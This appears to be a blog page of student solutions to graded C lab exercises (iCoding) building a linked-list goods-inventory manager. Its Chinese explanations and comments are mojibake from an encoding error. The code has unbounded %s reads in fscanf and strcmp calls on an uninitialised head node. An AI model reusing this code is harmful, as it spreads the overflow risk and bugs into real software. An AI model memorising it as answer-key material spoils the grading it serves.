class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>GoodsInfo data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; GoodsList;<br><br>GoodsInfo <span class="hljs-title function_">read_goods_info</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">init_list</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list_and_file</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">save_to_file</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">output_one_item</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">output_all_items</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">insert_item</span><span class="hljs-params">(GoodsList *L, GoodsInfo item, <span class="hljs-type">int</span> choice)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">delete_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id)</span>;<br>GoodsList* <span class="hljs-title function_">search_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id, GoodsInfo new_info)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br></code></pre></td></tr></table></figure><p>è¯¥éƒ¨åˆ†å£°æ˜å·²åŒ…å«åœ¨ â€œlab52.hâ€ä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> code;<br>    GoodsList *GoodsList;<br>    init_list(&amp;GoodsList);<br>    <span class="hljs-type">char</span> id[MAX_ID_LEN];<br><br>    <span class="hljs-type">char</span> *<span class="hljs-built_in">list</span> = <span class="hljs-string">&quot;1.æ˜¾ç¤ºæ‰€æœ‰å•†å“çš„ä¿¡æ¯\n2.ä¿®æ”¹æŸä¸ªå•†å“çš„ä¿¡æ¯\n3.æ’å…¥æŸä¸ªå•†å“çš„ä¿¡æ¯\n4.åˆ é™¤æŸä¸ªå•†å“çš„ä¿¡æ¯\n5.æŸ¥æ‰¾æŸä¸ªå•†å“çš„ä¿¡æ¯\n6.å•†å“å­˜ç›˜å¹¶é€€å‡ºç³»ç»Ÿ\n7.å¯¹å•†å“ä»·æ ¼è¿›è¡Œæ’åº\n8.(æ…ç”¨)åˆ é™¤æ‰€æœ‰å†…å®¹\nå…¶ä»–.ä¸å­˜ç›˜å¹¶é€€å‡ºç³»ç»Ÿ&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-built_in">list</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;code);<br>        <span class="hljs-keyword">switch</span> (code)<br>        &#123;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            output_all_items(GoodsList);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            GoodsInfo newInfo = read_goods_info();<br>            change_item(GoodsList, id, newInfo);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        &#123;<br>            <span class="hljs-type">int</span> choice;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice);<br>            GoodsInfo newInfo = read_goods_info();<br>            insert_item(GoodsList, newInfo, choice);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            delete_item(GoodsList, id);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            search_item(GoodsList, id);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            save_to_file(GoodsList);<br>            destory_list(&amp;GoodsList);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// break;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            bubble_sort(GoodsList);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            destory_list_and_file(&amp;GoodsList);<br>            <span class="hljs-comment">// return 0;</span><br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            destory_list(&amp;GoodsList);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š02-åˆå§‹åŒ–"><a href="#é“¾è¡¨ï¼š02-åˆå§‹åŒ–" class="headerlink" title="é“¾è¡¨ï¼š02-åˆå§‹åŒ–"></a>é“¾è¡¨ï¼š02-åˆå§‹åŒ–</h3><blockquote><p>å‡½æ•°åŸå‹ï¼švoid init_list(GoodsList **L)</p><p>å…¶ä¸­ *L ä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼ŒLä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹æŒ‡é’ˆçš„åœ°å€ï¼Œinit_listé¦–å…ˆåˆ›å»ºé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼Œä¹‹åè¯»å–goodsinfo.txt<a href="https://icoding.run/static/goodsinfo.txt">(ç¤ºä¾‹æ–‡ä»¶ä¸‹è½½)</a>ä¸­çš„å•†å“ä¿¡æ¯ï¼Œå¹¶åˆå§‹åŒ–é“¾è¡¨ï¼Œå‡½æ•°æ‰§è¡Œåï¼Œéœ€ç¡®ä¿ *L ä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆã€‚</p><p>init_list å®ç°å•†å“ä¿¡æ¯é“¾è¡¨çš„åˆå§‹åŒ–ï¼Œå‡½æ•°ä»å·²æœ‰çš„å•†å“ä¿¡æ¯æ–‡ä»¶goodsinfo.txt<a href="https://icoding.run/static/goodsinfo.txt">(ç¤ºä¾‹æ–‡ä»¶ä¸‹è½½)</a>ä¸­è¯»å…¥å•†å“ä¿¡æ¯ï¼Œå¹¶ä¸”åˆ†é…å†…å­˜ä¿å­˜è‡³é“¾è¡¨ä¸­ã€‚<br>ä¸ºäº†æ–¹ä¾¿åœ¨è¡¨å¤´æ’å…¥å’Œåˆ é™¤ç»“ç‚¹çš„æ“ä½œï¼Œç»å¸¸åœ¨è¡¨å¤´ç»“ç‚¹ï¼ˆå­˜å‚¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç»“ç‚¹ï¼‰çš„å‰é¢å¢åŠ ä¸€ä¸ªç»“ç‚¹ï¼Œç§°ä¹‹ä¸ºå¤´ç»“ç‚¹æˆ–è¡¨å¤´é™„åŠ ç»“ç‚¹ã€‚è¿™æ ·åŸæ¥çš„è¡¨å¤´æŒ‡é’ˆç”±æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç»“ç‚¹æ”¹ä¸ºæŒ‡å‘å¤´ç»“ç‚¹ï¼Œå¤´ç»“ç‚¹çš„æ•°æ®åŸŸä¸ºç©ºï¼Œå¤´ç»“ç‚¹çš„æŒ‡é’ˆåŸŸæŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç»“ç‚¹ã€‚</p><p>æ³¨ï¼šä½¿ç”¨ fopen å‡½æ•°æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶åå¿…é¡»ä¸º GOODS_FILE_NAMEï¼Œå¦åˆ™æ£€æµ‹ä¸é€šè¿‡ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_list</span><span class="hljs-params">(GoodsList **pL)</span><br>&#123;<br>    *pL = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>    (*pL)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    GoodsList *Cur = *pL;<br>    GoodsInfo info;<br><br>    FILE *f;<br>    f = fopen(GOODS_FILE_NAME, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!f)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open file for reading&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(f, <span class="hljs-string">&quot;%s\t%s\t%d\t%s\t%d\t%d\n&quot;</span>,<br>                  info.goods_id,<br>                  info.goods_name,<br>                  &amp;info.goods_price,<br>                  info.goods_discount,<br>                  &amp;info.goods_amount,<br>                  &amp;info.goods_remain) != EOF)<br>    &#123;<br>        GoodsList *L = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>        L-&gt;data = info;<br>        L-&gt;next = Cur-&gt;next;<br>        Cur-&gt;next = L;<br>        Cur = Cur-&gt;next;<br>        CurrentCnt++;<br>    &#125;<br>    fclose(f);<br>    f = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š03-æ’å…¥"><a href="#é“¾è¡¨ï¼š03-æ’å…¥" class="headerlink" title="é“¾è¡¨ï¼š03-æ’å…¥"></a>é“¾è¡¨ï¼š03-æ’å…¥</h3><blockquote><p>å‡½æ•°åŸå‹ï¼šbool insert_item(GoodsList *L, GoodsInfo goodsInfo, int choice)ï¼Œ</p><p>Lä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼Œå‡½æ•°æ ¹æ®choiseçš„å€¼ï¼Œå°†goodsInfoæ’å…¥åˆ°é“¾è¡¨çš„æŒ‡å®šä½ç½®ï¼Œå¦‚æœæˆåŠŸæ’å…¥ï¼Œå‡½æ•°è¿”å›trueï¼Œå¦‚æœæœªæ’å…¥ï¼Œå‡½æ•°è¿”å›falseã€‚</p><p>åˆ†åˆ«å®ç°å¤´æ’æ³•ã€å°¾æ’æ³•ï¼Œä¸­é—´ä½ç½®æ’å…¥ä¸‰ç§:</p><ul><li>ç”¨æˆ·è¾“å…¥0ï¼Œå°†å•†å“ä¿¡æ¯æ’å…¥åˆ°é“¾è¡¨å°¾éƒ¨ï¼›</li><li>ç”¨æˆ·è¾“å…¥1ï¼Œå°†å•†å“ä¿¡æ¯æ’å…¥åˆ°é“¾è¡¨å¤´éƒ¨ï¼›</li><li>ç”¨æˆ·è¾“å…¥å…¶å®ƒæ­£æ•´æ•°iï¼Œå°†å•†å“ä¿¡æ¯æ’å…¥åˆ°é“¾è¡¨ä¸­é—´ç¬¬iå·ä½ç½®, ä¾‹å¦‚ï¼šè¾“å…¥3ï¼Œåº”è¯¥åœ¨ç¬¬äºŒä¸ªèŠ‚ç‚¹åæ’å…¥æ–°èŠ‚ç‚¹</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">insert_item</span><span class="hljs-params">(GoodsList *L, GoodsInfo item, <span class="hljs-type">int</span> choice)</span><br>&#123;<br>    GoodsList *pL = (GoodsList *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(GoodsList));<br>    pL-&gt;data = item;<br><br>    GoodsList *Cur = L;<br><br>    <span class="hljs-keyword">switch</span> (choice)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>    &#123;<br>        <span class="hljs-keyword">while</span> (Cur-&gt;next)<br>            Cur = Cur-&gt;next;<br>        pL-&gt;next = <span class="hljs-literal">NULL</span>;<br>        Cur-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        pL-&gt;next = L-&gt;next;<br>        L-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>    &#123;<br>        <span class="hljs-type">int</span> k = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k++ != choice)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!Cur-&gt;next || choice &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>            Cur = Cur-&gt;next;<br>        &#125;<br><br>        pL-&gt;next = Cur-&gt;next;<br>        Cur-&gt;next = pL;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    &#125;<br>    CurrentCnt++;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š04-åˆ é™¤èŠ‚ç‚¹"><a href="#é“¾è¡¨ï¼š04-åˆ é™¤èŠ‚ç‚¹" class="headerlink" title="é“¾è¡¨ï¼š04-åˆ é™¤èŠ‚ç‚¹"></a>é“¾è¡¨ï¼š04-åˆ é™¤èŠ‚ç‚¹</h3><blockquote><p>å‡½æ•°åŸå‹ï¼šbool delete_item(GoodsList <em>L, char</em> goods_id)</p><p>å…¶ä¸­Lä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼Œgoods_idä¸ºè¦åˆ é™¤å•†å“çš„IDï¼›</p><p>å¦‚æœæˆåŠŸåˆ é™¤ï¼Œå‡½æ•°è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</p><p>delete_item æ ¹æ®å•†å“çš„IDæ¥åˆ é™¤å¯¹åº”çš„å•†å“ä¿¡æ¯ï¼Œå•†å“æŸ¥æ‰¾é€šè¿‡å­—ç¬¦ä¸²æ¯”è¾ƒçš„æ–¹å¼ï¼ŒæŸ¥æ‰¾åˆ°åé‡Šæ”¾å¯¹åº”æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜åŒºåŸŸï¼Œå®Œæˆåˆ é™¤ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">delete_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id)</span><br>&#123;<br>    GoodsList *Cur = L, *Del = Cur-&gt;next;<br>    <span class="hljs-keyword">while</span> (Del)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Del-&gt;data.goods_id, goods_id))<br>        &#123;<br>            Cur-&gt;next = Del-&gt;next;<br>            <span class="hljs-built_in">free</span>(Del);<br>            CurrentCnt--;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        Del = Del-&gt;next;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š05-æŸ¥æ‰¾"><a href="#é“¾è¡¨ï¼š05-æŸ¥æ‰¾" class="headerlink" title="é“¾è¡¨ï¼š05-æŸ¥æ‰¾"></a>é“¾è¡¨ï¼š05-æŸ¥æ‰¾</h3><blockquote><p>å‡½æ•°åŸå‹ï¼šGoodsList* search_item(GoodsList <em>L, char</em> goods_id)</p><p>å…¶ä¸­Lä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼Œgoods_idä¸ºè¦æŸ¥æ‰¾å•†å“çš„IDï¼›</p><p>å¦‚æœæ‰¾åˆ°è¯¥å•†å“ï¼Œå‡½æ•°è¿”å›è¯¥å•†å“å¯¹åº”çš„ç»“ç‚¹æŒ‡é’ˆï¼Œå¦åˆ™è¿”å› NULL.</p><p>æ ¹æ®è¾“å…¥çš„å•†å“ ID æ¥æŸ¥æ‰¾å¯¹åº”çš„å•†å“ä¿¡æ¯ï¼Œå•†å“ ID çš„åˆ¤æ–­ç”¨å­—ç¬¦ä¸²æ¯”è¾ƒçš„æ–¹å¼æ¥å®ç°ï¼Œç„¶åè°ƒç”¨æ ¼å¼åŒ–æ˜¾ç¤ºæŸ¥æ‰¾åˆ°çš„å•†å“ä¿¡æ¯.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br>GoodsList *<span class="hljs-title function_">search_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id)</span><br>&#123;<br>    GoodsList *Cur = L;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Cur-&gt;data.goods_id, goods_id))<br>        &#123;<br>            <span class="hljs-keyword">return</span> Cur;<br>        &#125;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š06-ä¿®æ”¹"><a href="#é“¾è¡¨ï¼š06-ä¿®æ”¹" class="headerlink" title="é“¾è¡¨ï¼š06-ä¿®æ”¹"></a>é“¾è¡¨ï¼š06-ä¿®æ”¹</h3><blockquote><p>å‡½æ•°åŸå‹ï¼šbool change_item(GoodsList <em>L, char</em> goods_id, GoodsInfo new_info)</p><p>å…¶ä¸­ L ä¸ºæŒ‡å‘é“¾è¡¨å¤´ç»“ç‚¹çš„æŒ‡é’ˆï¼Œgoods_id ä¸ºè¦ä¿®æ”¹çš„å•†å“ IDï¼Œnew_info ä¸ºè¯¥å•†å“çš„æœ€æ–°æ•°æ®ã€‚å‡½æ•°æˆåŠŸä¿®æ”¹åè¿”å›trueï¼Œå¦åˆ™è¿”å› falseã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œå¤´æ–‡ä»¶ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> CurrentCnt; <span class="hljs-comment">// è¯·ä¸è¦åˆ é™¤æœ¬è¡Œçš„å…¨å±€å˜é‡å£°æ˜ï¼Œå¦åˆ™æ£€æŸ¥ä¸é€šè¿‡</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span> *goods_id, GoodsInfo new_info)</span><br>&#123;<br>    GoodsList *Cur = L;<br>    <span class="hljs-keyword">while</span> (Cur)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(Cur-&gt;data.goods_id, goods_id))<br>        &#123;<br>            Cur-&gt;data = new_info;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        Cur = Cur-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é“¾è¡¨ï¼š07-æ˜¾ç¤ºå•ä¸ªèŠ‚ç‚¹"><a href="#é“¾è¡¨ï¼š07-æ˜¾ç¤ºå•ä¸ªèŠ‚ç‚¹" class="headerlink" 